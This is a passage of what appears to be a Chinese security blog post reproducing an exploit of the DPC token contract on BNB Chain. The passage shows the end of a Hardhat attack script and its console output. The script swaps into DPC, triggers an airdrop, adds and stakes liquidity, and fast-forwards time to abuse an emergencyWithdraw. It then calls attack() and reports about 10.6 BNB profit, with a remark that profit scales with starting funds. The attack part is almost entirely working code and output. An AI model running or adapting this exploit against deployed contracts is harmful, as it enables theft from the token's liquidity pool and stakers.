class="string">&#x27;IBEP20&#x27;</span>, wbnb)</span><br><span class="line">    <span class="keyword">let</span> usdtContract = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractAt</span>(<span class="string">&#x27;IBEP20&#x27;</span>, usdt)</span><br><span class="line">    <span class="keyword">let</span> dpcContract = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractAt</span>(<span class="string">&#x27;IBEP20&#x27;</span>, dpc)</span><br><span class="line">    <span class="keyword">let</span> pairContract = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractAt</span>(<span class="string">&#x27;IBEP20&#x27;</span>, pair)</span><br><span class="line">    bal1 = <span class="keyword">await</span> wbnbContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    bal2 = <span class="keyword">await</span> usdtContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    bal3 = <span class="keyword">await</span> dpcContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//step2 prepare money...</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bofore attack contract wbnb balance is:&quot;</span>,bal1/<span class="number">1e18</span>)</span><br><span class="line">    <span class="comment">//向合约转入2bnb做准备</span></span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">approveall</span>(&#123;</span><br><span class="line">        <span class="attr">value</span>: hre.<span class="property">ethers</span>.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">swapBnbToUsdt</span>();</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">swapUsdtToDpc</span>();</span><br><span class="line">    bal4 = <span class="keyword">await</span> dpcContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    bal7 = <span class="keyword">await</span> usdtContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;prepare complete dpc balance is:&quot;</span>,bal4/<span class="number">1e18</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;prepare complete usdt balance is:&quot;</span>,bal7/<span class="number">1e18</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">tokenairdrop</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addLiquidity...&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">addliquidity</span>();</span><br><span class="line">    bal8 = pairContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addliquidity complete lp balance is:&quot;</span>,bal8/<span class="number">1e18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start stake...&quot;</span>);</span><br><span class="line">    bal5 = <span class="keyword">await</span> pairContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;attack contract lp balance is:&quot;</span>,bal5/<span class="number">1e18</span>)</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">stakelp</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wait for 10 min, to met the emergencyWithdraw time requirement.&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> hre.<span class="property">network</span>.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_increaseTime&quot;</span>, [<span class="number">600</span>]);</span><br><span class="line">    <span class="keyword">await</span> hre.<span class="property">network</span>.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&quot;evm_mine&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">attack</span>()</span><br><span class="line">    bal6 = <span class="keyword">await</span> wbnbContract.<span class="title function_">balanceOf</span>(attack.<span class="property">address</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;attack complete bnb balance is:&quot;</span>,bal6/<span class="number">1e18</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">attack contrack deployed address <span class="attr">is</span>: <span class="number">0x935155685E46b18B08f5F986d75e5DcB91f17a26</span></span><br><span class="line">bofore attack contract wbnb balance <span class="attr">is</span>: <span class="number">0</span></span><br><span class="line">prepare complete dpc balance <span class="attr">is</span>: <span class="number">20.923067754791003</span></span><br><span class="line">prepare complete usdt balance <span class="attr">is</span>: <span class="number">288.1982206006127</span></span><br><span class="line">addLiquidity...</span><br><span class="line">addliquidity complete lp balance <span class="attr">is</span>: <span class="title class_">NaN</span></span><br><span class="line">start stake...</span><br><span class="line">attack contract lp balance <span class="attr">is</span>: <span class="number">6.5433852220376</span></span><br><span class="line">wait <span class="keyword">for</span> <span class="number">10</span> min, to met the emergencyWithdraw time requirement.</span><br><span class="line">attack complete bnb balance <span class="attr">is</span>: <span class="number">10.634457706077313</span></span><br></pre></td></tr></table></figure>
+
+<p>获利大小与初始资金有关</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/HiT0on" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2022 d1rrick<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
